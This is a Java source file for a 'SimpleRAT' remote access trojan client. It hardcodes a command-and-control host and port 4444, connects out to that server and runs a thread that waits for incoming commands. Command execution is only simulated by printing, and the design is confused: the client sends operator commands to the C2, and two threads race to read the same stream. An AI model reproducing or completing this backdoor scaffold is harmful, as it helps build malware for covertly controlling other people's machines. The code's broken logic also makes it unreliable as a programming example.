import java.io.*;
import java.net.*;
import java.util.Scanner;
 
public class SimpleRAT {
 
    // ====================================================================
    // --- GLOBAL RAT CONFIGURATION (Hardcoded Inside) ---
    // ====================================================================
 
    private static final String C2_HOST = "192.168.1.1"; // IP address or domain of the C2 server
    private static final int C2_PORT = 4444;           // Port the C2 server is listening on
    private static final int BUFFER_SIZE = 1024;       // Size of data chunks to receive
 
    // ====================================================================
    // --- RAT STATE VARIABLES ---
    // ====================================================================
 
    private static Socket clientSocket = null;
    private static PrintWriter out;
    private static BufferedReader in;
    private static volatile boolean running = true;
 
    public static void main(String[] args) {
        System.out.println("=============================================");
        System.out.println("        Simple Java RAT Initializing         ");
        System.out.println("=============================================");
 
        connectToC2();
 
        if (clientSocket != null && clientSocket.isConnected()) {
            System.out.println("\n[RAT] Successfully connected to C2 Server.");
 
            // Start the thread to continuously listen for incoming C2 commands
            Thread receiverThread = new Thread(new DataReceiver());
            receiverThread.start();
 
            // Main thread handles user input (sending commands)
            Scanner scanner = new Scanner(System.in);
            while (running) {
                System.out.print("\nEnter command (e.g., status, get_info, shutdown): ");
                String command = scanner.nextLine();
                if (command.equalsIgnoreCase("shutdown")) {
                    sendCommand("shutdown");
                    running = false;
                } else if (!command.isEmpty()) {
                    sendCommand(command);
                }
            }
 
            // Cleanup
            System.out.println("\n[RAT] Shutting down connection.");
            closeConnection();
            receiverThread.interrupt();
        } else {
            System.err.println("\n[RAT] Failed to connect to C2 Server. Exiting.");
        }
    }
 
    /**
     * Establishes the TCP connection to the C2 server.
     */
    private static void connectToC2() {
        try {
            System.out.println("[RAT] Attempting to connect to C2 server at " + C2_HOST + ":" + C2_PORT + "...");
            clientSocket = new Socket(C2_HOST, C2_PORT);
 
            // Set up input/output streams
            out = new PrintWriter(clientSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
 
        } catch (UnknownHostException e) {
            System.err.println("[RAT] Error: Unknown host address: " + C2_HOST);
        } catch (ConnectException e) {
            System.err.println("[RAT] Error: Connection refused. Is the C2 server running? (" + C2_HOST + ":" + C2_PORT + ")");
        } catch (IOException e) {
            System.err.println("[RAT] An unexpected IO error occurred during connection: " + e.getMessage());
        }
    }
 
    /**
     * Sends a command to the C2 server and waits for a response.
     * @param command The command string to send.
     * @return The response received from the server, or null on failure.
     */
    private static String sendCommand(String command) {
        if (clientSocket == null || !clientSocket.isConnected()) {
            System.out.println("[RAT] ERROR: Not connected to the C2 server.");
            return null;
        }
 
        System.out.println("[RAT] Sending command: '" + command + "'");
        try {
            out.println(command);
            // Wait for the response from the C2 server
            String response = in.readLine();
            System.out.println("[C2 Response]: " + (response != null ? response : "[No response received]"));
            return response;
        } catch (IOException e) {
            System.err.println("[RAT] Error during command transmission or reception: " + e.getMessage());
            return null;
        }
    }
 
    /**
     * Continuous thread that listens for incoming commands from the C2 server.
     */
    private static class DataReceiver implements Runnable {
        @Override
        public void run() {
            while (running) {
                try {
                    // Read a line (assuming C2 sends commands line by line)
                    String command = in.readLine();
                    if (command == null) {
                        System.out.println("[RAT] C2 connection closed by peer.");
                        running = false;
                        break;
                    }
                    System.out.println("\n[C2 Command Received]: " + command);
 
                    if (command.trim().equalsIgnoreCase("shutdown")) {
                        System.out.println("[RAT] Shutdown command received. Terminating connection.");
                        running = false;
                        break;
                    }
 
                    // --- Simple Simulated Execution Logic ---
                    if (command.trim().equalsIgnoreCase("status")) {
                        System.out.println("[RAT] Running status: System operational.");
                    } else if (command.trim().equalsIgnoreCase("get_info")) {
                        System.out.println("[RAT] Gathering system info: OS=Win10, Mem=8GB (Simulated).");
                    } else {
                        System.out.println("[RAT] Executing custom command: " + command);
                    }
 
                } catch (IOException e) {
                    if (running) {
                        System.err.println("[RAT] Error reading from C2 stream (Connection likely lost): " + e.getMessage());
                    }
                    running = false;
                    break;
                }
            }
        }
    }
 
    /**
     * Closes all network resources.
     */
    private static void closeConnection() {
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (clientSocket != null && !clientSocket.isClosed()) clientSocket.close();
        } catch (IOException e) {
            System.err.println("[RAT] Error closing socket: " + e.getMessage());
        }
    }
}
